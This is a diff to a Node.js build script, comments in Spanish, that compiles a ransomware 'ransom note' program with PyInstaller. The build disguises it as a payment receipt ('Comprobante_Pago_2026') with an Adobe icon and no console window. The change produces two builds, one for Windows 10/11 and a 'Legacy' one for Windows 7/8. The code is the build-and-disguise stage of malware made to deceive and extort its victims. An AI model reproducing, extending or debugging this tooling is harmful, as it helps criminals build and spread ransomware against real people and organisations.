@@ -40,41 +40,43 @@ function runBuild(filename) {
         return false;
     }
 
-    // 3. Run PyInstaller (Ransom Note)
-    const noteName = 'Comprobante_Pago_2026.exe';
+    // 3. Run PyInstaller (Ransom Notes - TWO VERSIONS)
+    const iconRef = 'adobe_icon.ico';
+    const iconAbsPath = path.resolve(__dirname, iconRef);
+    const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
 
-    // Always recompile if we want to ensure the icon is applied
-    if (true) {
+    // === NOTA 1: VERSION PYQT6 (Windows 10/11) ===
+    const noteWin10 = 'Comprobante_Pago_2026';  // Para Win10/11
+    if (fs.existsSync('interfazdeaviso.py')) {
         try {
-            // Usar icono si existe (.ico preferido) - RUTA ABSOLUTA REQUERIDA
-            const iconRef = 'adobe_icon.ico';
-            const iconAbsPath = path.resolve(__dirname, iconRef);
-            const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
-
-            // USAR VERSION TKINTER (compatible con Windows 7/8/10/11)
-            const pyScript = fs.existsSync('interfazdeaviso_tk.py') ? 'interfazdeaviso_tk.py' : 'interfazdeaviso.py';
-            console.log(`   [PYTHON] Compilando Nota de Rescate (${noteName}) con ${pyScript}...`);
-
-            // Intento 1: Usar via modulo (evita problemas de PATH)
-            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" ${pyScript}`, { stdio: 'inherit' });
-            console.log(`   [PYTHON] Nota compilada con exito.`);
+            console.log(`   [PYTHON] Compilando Nota PyQt6 (${noteWin10}.exe) para Windows 10/11...`);
+            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
+            console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
         } catch (e) {
-            const iconRef = 'adobe_icon.ico';
-            const iconAbsPath = path.resolve(__dirname, iconRef);
-            const iconArg = fs.existsSync(iconRef) ? `--icon="${iconAbsPath}"` : '';
-            const pyScript = fs.existsSync('interfazdeaviso_tk.py') ? 'interfazdeaviso_tk.py' : 'interfazdeaviso.py';
-
-            console.log(`   [PYTHON] Modulo fallito. Intentando comando global 'pyinstaller'...`);
             try {
-                // Intento 2: Comando directo
-                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteName.replace('.exe', '')}" ${pyScript}`, { stdio: 'inherit' });
-                console.log(`   [PYTHON] Nota compilada con exito.`);
+                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work --specpath build/py_spec --name "${noteWin10}" interfazdeaviso.py`, { stdio: 'inherit' });
+                console.log(`   [PYTHON] Nota Win10/11 compilada con exito.`);
             } catch (err) {
-                console.log(`   [PYTHON] Advertencia: No se pudo compilar la nota.`);
+                console.log(`   [PYTHON] Advertencia: No se pudo compilar nota PyQt6.`);
             }
         }
-    } else {
-        // Unreachable but keeping structure if needed later
+    }
+
+    // === NOTA 2: VERSION TKINTER (Windows 7/8/8.1) ===
+    const noteWin7 = 'Comprobante_Pago_2026_Legacy';  // Para Win7/8
+    if (fs.existsSync('interfazdeaviso_tk.py')) {
+        try {
+            console.log(`   [PYTHON] Compilando Nota Tkinter (${noteWin7}.exe) para Windows 7/8...`);
+            execSync(`python -m PyInstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${noteWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
+            console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
+        } catch (e) {
+            try {
+                execSync(`pyinstaller --onefile --noconsole ${iconArg} --distpath dist --workpath build/py_work_tk --specpath build/py_spec_tk --name "${noteWin7}" interfazdeaviso_tk.py`, { stdio: 'inherit' });
+                console.log(`   [PYTHON] Nota Win7/8 compilada con exito.`);
+            } catch (err) {
+                console.log(`   [PYTHON] Advertencia: No se pudo compilar nota Tkinter.`);
+            }
+        }
     }
 
     // Copiar recursos adicionales a dist/
